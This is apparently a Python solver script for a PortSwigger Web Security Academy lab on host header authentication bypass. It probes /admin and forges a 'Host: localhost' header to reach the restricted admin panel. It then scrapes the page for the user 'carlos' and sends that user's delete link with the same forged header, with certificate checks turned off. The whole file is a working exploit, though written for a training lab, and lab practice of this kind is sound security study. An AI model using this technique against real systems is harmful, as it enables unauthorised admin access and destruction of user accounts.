

import requests
import sys
from urllib.parse import urljoin
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

def solve_lab(url):
    print(f"[*] Targeting: {url}")
    print(f"[*] Lab: Host Header Authentication Bypass\n")
    
    # Ensure URL ends with /
    if not url.endswith('/'):
        url += '/'
    
    admin_url = urljoin(url, 'admin')
    
    # Create session with retry strategy
    session = requests.Session()
    retry = Retry(connect=3, backoff_factor=0.5)
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    
    # Step 1: Check robots.txt
    print(f"[*] Step 1: Checking /robots.txt")
    try:
        r = session.get(urljoin(url, 'robots.txt'), timeout=10)
        if r.status_code == 200 and '/admin' in r.text:
            print(f"[+] Found /admin path in robots.txt")
    except Exception as e:
        print(f"[!] Error checking robots.txt: {e}")
    
    # Step 2: Try normal access to /admin
    print(f"\n[*] Step 2: Attempting normal access to /admin")
    try:
        r = session.get(admin_url, timeout=10)
        print(f"[-] Status: {r.status_code} (Expected 403 Forbidden)")
        if 'local' in r.text.lower():
            print(f"[+] Error message confirms admin panel requires local access")
    except Exception as e:
        print(f"[!] Error: {e}")
    
    # Step 3: Access /admin with Host: localhost
    print(f"\n[*] Step 3: Accessing /admin with Host: localhost")
    print(f"[*] Using prepared request to bypass Host header restriction...")
    
    try:
        # Create a prepared request to override Host header
        req = requests.Request('GET', admin_url)
        prepared = session.prepare_request(req)
        prepared.headers['Host'] = 'localhost'
        
        # Send the prepared request
        r = session.send(prepared, timeout=10, verify=False)
        
        if r.status_code == 200:
            print(f"[+] Successfully accessed admin panel! Status: {r.status_code}")
            
            # Check if lab is already solved
            if 'is-solved' in r.text:
                print(f"\n[!] Lab appears to be already solved!")
                print(f"[*] The page shows 'Congratulations, you solved the lab!'")
                return
            
            # Parse HTML to find delete link for carlos
            soup = BeautifulSoup(r.text, 'html.parser')
            delete_link = None
            
            # Find all user delete links
            for a in soup.find_all('a', href=True):
                href = a['href']
                if 'delete' in href.lower() and 'carlos' in href.lower():
                    delete_link = href
                    break
            
            if delete_link:
                print(f"[*] Found delete link for carlos: {delete_link}")
                
                # Construct full delete URL
                delete_url = urljoin(url, delete_link)
                
                # Step 4: Delete carlos
                print(f"\n[*] Step 4: Deleting user carlos...")
                
                # Create prepared request for delete with Host: localhost
                req_delete = requests.Request('GET', delete_url)
                prepared_delete = session.prepare_request(req_delete)
                prepared_delete.headers['Host'] = 'localhost'
                
                r_delete = session.send(prepared_delete, timeout=10, verify=False)
                
                print(f"[*] Delete response status: {r_delete.status_code}")
                
                if r_delete.status_code in [200, 302, 303]:
                    print(f"[+] Delete request successful!")
                    
                    # Verify lab completion
                    print(f"\n[*] Verifying lab completion...")
                    r_verify = session.get(url, timeout=10)
                    
                    if 'is-solved' in r_verify.text or 'Congratulations' in r_verify.text:
                        print(f"[+] ✓ LAB SOLVED!")
                        print(f"[+] The lab page confirms successful completion.")
                    else:
                        print(f"[+] Delete completed. Check the lab page to confirm.")
                else:
                    print(f"[-] Delete request failed with status: {r_delete.status_code}")
            else:
                print(f"[-] Could not find delete link for user 'carlos'")
                print(f"[!] User may have already been deleted or page structure differs")
        else:
            print(f"[-] Failed to access admin panel. Status: {r.status_code}")
            
    except Exception as e:
        print(f"[!] Error during exploitation: {e}")
        import traceback
        traceback.print_exc()

def main():
    # Disable SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    # Default target URL
    target_url = "https://0ab800d204010bbc80dfd5eb00ba00d7.web-security-academy.net/"
    
    # Allow URL override via command line
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
    
    print("=" * 70)
    print("PortSwigger Lab Solver: Host Header Authentication Bypass")
    print("=" * 70)
    
    solve_lab(target_url)
    
    print("\n" + "=" * 70)
    print("Exploitation complete!")
    print("=" * 70)

if __name__ == "__main__":
    main()
